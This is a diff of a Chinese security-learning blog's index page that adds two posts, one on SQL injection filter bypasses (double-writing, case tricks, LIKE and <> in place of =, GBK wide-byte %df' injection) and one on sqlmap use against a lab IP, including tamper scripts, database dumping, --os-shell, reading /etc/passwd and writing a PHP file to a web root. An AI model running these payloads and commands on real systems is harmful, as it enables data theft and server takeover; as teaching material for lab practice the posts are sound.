@@ -75,6 +75,110 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-SQL注入的常见绕过方式" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/02/01/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/" class="article-date">
+  <time class="dt-published" datetime="2023-02-01T08:11:33.000Z" itemprop="datePublished">2023-02-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/02/01/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/">SQL注入的常见绕过方式</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="01关键词过滤绕过"><a href="#01关键词过滤绕过" class="headerlink" title="01关键词过滤绕过"></a>01关键词过滤绕过</h2><h3 id="方法一：双写绕过"><a href="#方法一：双写绕过" class="headerlink" title="方法一：双写绕过"></a>方法一：双写绕过</h3><p><img src="/images/31.png"></p>
+<h3 id="方法二：大小写绕过"><a href="#方法二：大小写绕过" class="headerlink" title="方法二：大小写绕过"></a>方法二：大小写绕过</h3><p><img src="/images/32.png"></p>
+<h2 id="02空格绕过"><a href="#02空格绕过" class="headerlink" title="02空格绕过"></a>02空格绕过</h2><h3 id="注释绕过空格"><a href="#注释绕过空格" class="headerlink" title="注释绕过空格"></a>注释绕过空格</h3><p><img src="/images/33.png"></p>
+<h3 id="空格其他绕过方式"><a href="#空格其他绕过方式" class="headerlink" title="空格其他绕过方式"></a>空格其他绕过方式</h3><p><img src="/images/34.png"></p>
+<h2 id="03过滤等号-x3D-绕过"><a href="#03过滤等号-x3D-绕过" class="headerlink" title="03过滤等号&#x3D;绕过"></a>03过滤等号&#x3D;绕过</h2><p>一、使用like绕过<br>使用通配符like 执行的效果和&#x3D;一致，所以可以用来绕过等号过滤。-1’ union select * from users where id like 2%23<br>二、使用&lt;&gt;绕过<br>&lt;&gt;等价于!&#x3D;所以我们可以在&lt;&gt;前加个!就变成等于了。例如:id&#x3D;-1’ union select * from users where !(id&lt;&gt;2)%23</p>
+<h2 id="04宽字节注入"><a href="#04宽字节注入" class="headerlink" title="04宽字节注入"></a>04宽字节注入</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>一、编码类型:<br>单字节字符集:所有的字符都使用一个字节来表示，比如ASCII编码。<br>多字节字符集:在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。<br>UTF-8编码:是一种编码的编码方式(多字节编码），它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度，一般会占3个字节。<br>GBK编码:也是一种多字节编码，它一般占两个字节。<br>而一般常见的存在宽字节注入的编码类型为:GBK和BIG5</p>
+<h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>二、宽字节注入:<br>在实际应用中，为防止注入漏洞通常会把单引号处理下，那又为啥要处理单引号呢?比如:<br>$ i d&#x3D;$_GET[ ‘id’];<br>select * from users where id &#x3D; ‘$id’<br>    上边呢我们输入进去的 SQL语句，都会赋值给$id这个变量，然后会被包含在引号里，在PHP中引号里的内容是属于字符串的，所以我们直接在这里输入的一些SQL命令都会被当作字符串处理，这些命令就不会起到作用。<br>    所以我们在字符型注入中才会先用单引号闭合下，再输入SQL命令，这样后面的命令才会执行。如果程序中在我们输入的单引号前加上个反斜杠比如: \’。这样的话这个单引号就是个字符了，没有单引号闭合的作用，所以就起到了防护的作用<br>为了突破这个防护，我们可以使用宽字节注入的方式进行突破:<br>我们的使用方式是:<br>%df’<br>当我们在单引号前加上%df 的时候，也就是输入%df’这样传入到数据库中就会变成:%df%5c’<br>那么宽字节注入的突破方式除了%df 之外还有其他的方式么?<br>其实是有的,我们可以看下GBK的编码表:<br><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php%E8%BF%99%E9%87%8C%E7%9A%84%DE%5C%E3%80%81%E0%5C%EF%BC%8C%E7%AD%89%E9%83%BD%E6%98%AF%E5%8F%AF%E4%BB%A5%E7%9A%84%E3%80%82">https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php这里的%DE%5C、%E0%5C，等都是可以的。</a></p>
+<h3 id="宽字节注入步骤"><a href="#宽字节注入步骤" class="headerlink" title="宽字节注入步骤"></a>宽字节注入步骤</h3><p>一、在i d&#x3D;1后面添加单引号发现被转义,在前面加了个<br><img src="/images/34.png"><br>二、使用%df进行闭合:i d&#x3D;1%df’ and 1&#x3D;1%23<br><img src="/images/35.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/02/01/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/" data-id="cldlgi6qs0000ewu77cpj7jfl" data-title="SQL注入的常见绕过方式" class="article-share-link">Teilen</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-sqlmap的一些使用" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/02/01/sqlmap%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BD%BF%E7%94%A8/" class="article-date">
+  <time class="dt-published" datetime="2023-02-01T07:17:56.000Z" itemprop="datePublished">2023-02-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/02/01/sqlmap%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BD%BF%E7%94%A8/">sqlmap的一些使用</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="sqlmap-tamper的使用"><a href="#sqlmap-tamper的使用" class="headerlink" title="sqlmap tamper的使用"></a>sqlmap tamper的使用</h2><p>  sqlmap是一款人见人爱的自动化SQL注入工具，能够以良好的引擎发现给定URL中的可注入处，并自动的完成注入。<br>    但是由于SQL注入的影响过于广泛，致使现代程序的防护越来越严密。为了突破这些防护，我们可以使用tamper。sqImap&#x2F;tamper是官方给出的些绕过脚本，可以配合渗透测试人员完成更高效更高质量的测试。<br>    当然我们也可以自己更有针对性的编写一些绕过脚本。</p>
+<h3 id="一、输入命令"><a href="#一、输入命令" class="headerlink" title="一、输入命令"></a>一、输入命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u 192.168.30.124:8203/base64.php? <span class="built_in">id</span>=MQ=—-tamper=base64encode</span><br></pre></td></tr></table></figure>
+<p><img src="/images/17.png"></p>
+<h3 id="二、获取数据库信息"><a href="#二、获取数据库信息" class="headerlink" title="二、获取数据库信息"></a>二、获取数据库信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap. py -u 192.168.30.124:8203/base64.php?<span class="built_in">id</span>=MQ==—-tamper=base64encode --dbs</span><br></pre></td></tr></table></figure>
+<p><img src="/images/18.png"></p>
+<h3 id="三、获取数据表信息"><a href="#三、获取数据表信息" class="headerlink" title="三、获取数据表信息"></a>三、获取数据表信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap.py -u 192.168.30.124:8203/base64.php?<span class="built_in">id</span>=MQ== --tamper=base64encode-D security --tables</span><br></pre></td></tr></table></figure>
+<p><img src="/images/19.png"></p>
+<h3 id="四、获取字段信息"><a href="#四、获取字段信息" class="headerlink" title="四、获取字段信息"></a>四、获取字段信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap.py -u 192.168.30.124:8203/base64.php?<span class="built_in">id</span>=MQ== --tamper=base64encode -D security -Tusers</span><br></pre></td></tr></table></figure>
+<p><img src="/images/20.png"></p>
+<h3 id="五、获取数据"><a href="#五、获取数据" class="headerlink" title="五、获取数据"></a>五、获取数据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap.py -u 192.168.30.124:8203/base64.php?<span class="built_in">id</span>=MQ==---tamper=base64encode -D security -T</span><br></pre></td></tr></table></figure>
+<p><img src="/images/21.png"></p>
+<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>-D后面是数据库名称<br>-T后面是表的名称<br>-C来指明字段<br>–dump来获取数据</p>
+<h2 id="sqlmap-–os-shell"><a href="#sqlmap-–os-shell" class="headerlink" title="sqlmap –os-shell"></a>sqlmap –os-shell</h2><p>sqlmap中的–os-shell命令是sqlmap提供的一个执行目标系统命令的交互式shell。<br>使用方法为:sqlmap.py -u URL –os-shell</p>
+<h2 id="sqlmap读写文件"><a href="#sqlmap读写文件" class="headerlink" title="sqlmap读写文件"></a>sqlmap读写文件</h2><pre><code>sqlmap提供了可读写文件的参数，首先找需要知道网站的物理路径，其次需要有可写或可读的权限。
+</code></pre>
+<p>(1) –file-read&#x3D;RFILE<br>  从后端的数据库管理系统文件系统读取文件（物理路径)<br>(2) –file-write&#x3D;WFILE<br>  编辑后端的数据库管理系统文件系统上的本地文件(mssql xp_shell)<br>(3) –file-dest&#x3D;DFILE<br>  后端的数据库管理系统写入文件的绝对路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap.py -u http://192.168.30.124:8203/Less-1/?<span class="built_in">id</span>=1 --file-read /etc/passwd</span><br></pre></td></tr></table></figure>
+<p><img src="/images/22.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap.py -u http://192.168.30.124:8203/Less-1/?<span class="built_in">id</span>=1 --file-dest /var/www/html/info.php</span><br></pre></td></tr></table></figure>
+<p><img src="/images/23.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/02/01/sqlmap%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BD%BF%E7%94%A8/" data-id="cldlgi6qx0003ewu72m9b7009" data-title="sqlmap的一些使用" class="article-share-link">Teilen</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-sqlmap安装" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2023/02/01/sqlmap%E5%AE%89%E8%A3%85/" class="article-date">
@@ -123,7 +227,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/02/01/sqlmap%E5%AE%89%E8%A3%85/" data-id="cldlarq770004t8u78lkc5p7v" data-title="sqlmap安装" class="article-share-link">Teilen</a>
+      <a data-url="http://example.com/2023/02/01/sqlmap%E5%AE%89%E8%A3%85/" data-id="cldlgi6qz0006ewu77jw7d8gv" data-title="sqlmap安装" class="article-share-link">Teilen</a>
       
       
       
@@ -157,12 +261,12 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>SQL注入漏洞产生原理分为1.不当的类型处理 2.不安全的数据库配置 3.不合理的查询集处理 4.不当的错误处理 5.转义字符处理不当 6.多个提交处理不当<br>SQL注入漏洞的检测 在URL: id&#x3D;33后边加入单引号，发现sQL语句报错<br>例如：<br><img src="/images/10.png"><br>SQL注入漏洞的利用<br><img src="/images/11.png"><br><img src="/images/12.png"><br><img src="/images/13.png"></p>
+        <p>SQL注入漏洞产生原理分为1.不当的类型处理 2.不安全的数据库配置 3.不合理的查询集处理 4.不当的错误处理 5.转义字符处理不当 6.多个提交处理不当<br>SQL注入漏洞的检测 在URL: id&#x3D;33后边加入单引号，发现sQL语句报错<br>例如：<br><img src="/images/10.png"><br>SQL注入漏洞的利用<br><img src="/images/11.png"><br><img src="/images/12.png"><br><img src="/images/13.png"><br><img src="/images/24.png"><br><img src="/images/25.png"><br><img src="/images/26.png"><br><img src="/images/27.png"><br><img src="/images/28.png"><br><img src="/images/29.png"><br><img src="/images/30.png"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/02/01/web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/" data-id="cldlarq770005t8u76lyg7rx7" data-title="web安全入门" class="article-share-link">Teilen</a>
+      <a data-url="http://example.com/2023/02/01/web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/" data-id="cldlgi6qz0007ewu73l4b5d6t" data-title="web安全入门" class="article-share-link">Teilen</a>
       
       
       
@@ -200,7 +304,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/01/13/ctfshow-%E8%90%8C%E6%96%B0-web9/" data-id="cldlarq750002t8u70jia8igd" data-title="ctfshow-萌新-web9" class="article-share-link">Teilen</a>
+      <a data-url="http://example.com/2023/01/13/ctfshow-%E8%90%8C%E6%96%B0-web9/" data-id="cldlgi6qy0005ewu77bga6pa0" data-title="ctfshow-萌新-web9" class="article-share-link">Teilen</a>
       
       
       
@@ -243,7 +347,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/01/13/ctfshow-%E8%90%8C%E6%96%B0-web3/" data-id="cldlarq740001t8u715y79tyu" data-title="ctfshow-萌新-web3" class="article-share-link">Teilen</a>
+      <a data-url="http://example.com/2023/01/13/ctfshow-%E8%90%8C%E6%96%B0-web3/" data-id="cldlgi6qw0002ewu76jzu24es" data-title="ctfshow-萌新-web3" class="article-share-link">Teilen</a>
       
       
       
@@ -288,7 +392,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/01/13/ctfshow-%E8%90%8C%E6%96%B0-web2/" data-id="cldlarq710000t8u7geu6g6nd" data-title="ctfshow-萌新-web2" class="article-share-link">Teilen</a>
+      <a data-url="http://example.com/2023/01/13/ctfshow-%E8%90%8C%E6%96%B0-web2/" data-id="cldlgi6qv0001ewu7ghd41dmk" data-title="ctfshow-萌新-web2" class="article-share-link">Teilen</a>
       
       
       
@@ -336,7 +440,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/01/08/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" data-id="cldlarq770006t8u7a0f986f9" data-title="我的第一篇博客ctfshow -萌新-web1" class="article-share-link">Teilen</a>
+      <a data-url="http://example.com/2023/01/08/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" data-id="cldlgi6r00008ewu74o3wh5tc" data-title="我的第一篇博客ctfshow -萌新-web1" class="article-share-link">Teilen</a>
       
       
       
@@ -387,7 +491,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/01/07/hello-world/" data-id="cldlarq760003t8u70k3g2xdz" data-title="Hello World" class="article-share-link">Teilen</a>
+      <a data-url="http://example.com/2023/01/07/hello-world/" data-id="cldlgi6qy0004ewu72kf4cu1w" data-title="Hello World" class="article-share-link">Teilen</a>
       
       
       
@@ -430,6 +534,14 @@
       <ul>
         
           <li>
+            <a href="/2023/02/01/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/">SQL注入的常见绕过方式</a>
+          </li>
+        
+          <li>
+            <a href="/2023/02/01/sqlmap%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BD%BF%E7%94%A8/">sqlmap的一些使用</a>
+          </li>
+        
+          <li>
             <a href="/2023/02/01/sqlmap%E5%AE%89%E8%A3%85/">sqlmap安装</a>
           </li>
         
@@ -439,14 +551,6 @@
         
           <li>
             <a href="/2023/01/13/ctfshow-%E8%90%8C%E6%96%B0-web9/">ctfshow-萌新-web9</a>
-          </li>
-        
-          <li>
-            <a href="/2023/01/13/ctfshow-%E8%90%8C%E6%96%B0-web3/">ctfshow-萌新-web3</a>
-          </li>
-        
-          <li>
-            <a href="/2023/01/13/ctfshow-%E8%90%8C%E6%96%B0-web2/">ctfshow-萌新-web2</a>
           </li>
         
       </ul>
